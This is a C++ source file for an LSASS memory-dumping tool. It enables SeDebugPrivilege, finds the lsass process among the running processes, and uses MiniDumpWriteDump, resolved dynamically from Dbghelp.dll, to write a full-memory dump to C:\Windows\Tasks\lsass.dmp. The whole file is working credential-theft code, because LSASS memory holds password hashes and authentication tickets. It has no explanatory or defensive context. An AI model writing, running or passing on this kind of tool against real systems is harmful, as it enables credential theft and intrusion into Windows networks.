// minidumper.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <fstream>
#include <Windows.h>
#include <DbgHelp.h>
#include <processthreadsapi.h>
#include <Psapi.h>
#include <cwctype>
#include <memory>
#include <algorithm>
#pragma comment(lib, "advapi32.lib")

typedef BOOL (*_MiniDumpWriteDump)(
	HANDLE                            hProcess,
	DWORD                             ProcessId,
	HANDLE                            hFile,
	MINIDUMP_TYPE                     DumpType,
	PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
	PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
	PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("1 LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("2 AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

int main()
{
	HANDLE thandle;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &thandle);
	if (SetPrivilege(thandle, L"SeDebugPrivilege", true))
		std::wcout << "[i] Set token privileges successfully" << std::endl;	
	CloseHandle(thandle);
	HMODULE mod = LoadLibrary(L"Dbghelp.dll");
	_MiniDumpWriteDump MiniDumpWriteDump{ nullptr };
	if (!mod) {
		std::cout << "Mod load failed\n";
		return -1;
	}
	MiniDumpWriteDump = (_MiniDumpWriteDump)GetProcAddress(mod, "MiniDumpWriteDump");
	DWORD lpidProcess[1024], cb{ 1024 }, lpcNeeded{ 0 };
	if (EnumProcesses(lpidProcess, cb, &lpcNeeded)) {
		TCHAR szProcessName[MAX_PATH] = TEXT("nic");

		DWORD procCount = lpcNeeded / sizeof(DWORD);
		HANDLE hProcess{ nullptr };
		DWORD hProcessId{ 0 };
		bool foundLsass{ false };
		std::cout << "[i] Found " << procCount << " processes" << std::endl;
		for (DWORD i = 0; i < procCount; i++) {
			//std::wcout << "[i] lpidProcess " << i << ": " << lpidProcess[i] << std::endl;
			if (lpidProcess[i]) {
				hProcess = OpenProcess(PROCESS_VM_READ| PROCESS_QUERY_INFORMATION, FALSE, lpidProcess[i]);
				if (hProcess) {
					HMODULE hMod;
					DWORD cbNeeded;
					if (EnumProcessModulesEx(hProcess, &hMod, sizeof(hMod), &cbNeeded, LIST_MODULES_ALL)) {
						GetModuleFileNameEx(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
						std::wstring tmp = szProcessName;
						std::wstring found = [&]()->std::wstring { std::transform(tmp.begin(), tmp.end(), tmp.begin(), [](wint_t c) { return std::tolower(c); }); return tmp; }();
						std::wcout << "Process: " << found << std::endl;
						if (found.find(L"lsass") != std::wstring::npos) {
							hProcessId = lpidProcess[i];
							std::cout << "[i] Found lsass: " << hProcessId << std::endl;
							HANDLE dmp = CreateFile(L"C:\\Windows\\Tasks\\lsass.dmp", GENERIC_WRITE, 0, nullptr, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
							if (dmp) {
								if (MiniDumpWriteDump(hProcess, hProcessId, dmp, MINIDUMP_TYPE::MiniDumpWithFullMemory, nullptr, nullptr, nullptr))
									std::cout << "[i] Dump success!\n";
								else
									printf("[!] Dump error: %08x", GetLastError());
								CloseHandle(dmp);
							}
							CloseHandle(hProcess);
							return 0;
						}
						else {
							CloseHandle(hProcess);
							hProcess = nullptr;
						}
					}
					else {
						std::wcerr << "[!] Failed to enumerate process: " << lpidProcess[i] << "(" << GetLastError() << ")" << std::endl;
						CloseHandle(hProcess);
						hProcess = nullptr;
					}
				}
				else
					std::cerr << "PID: " << lpidProcess[i] << " open failed! (" << GetLastError() << ")\n";
			}
		}
		std::cout << "[i] LSASS not found\n";
	}
}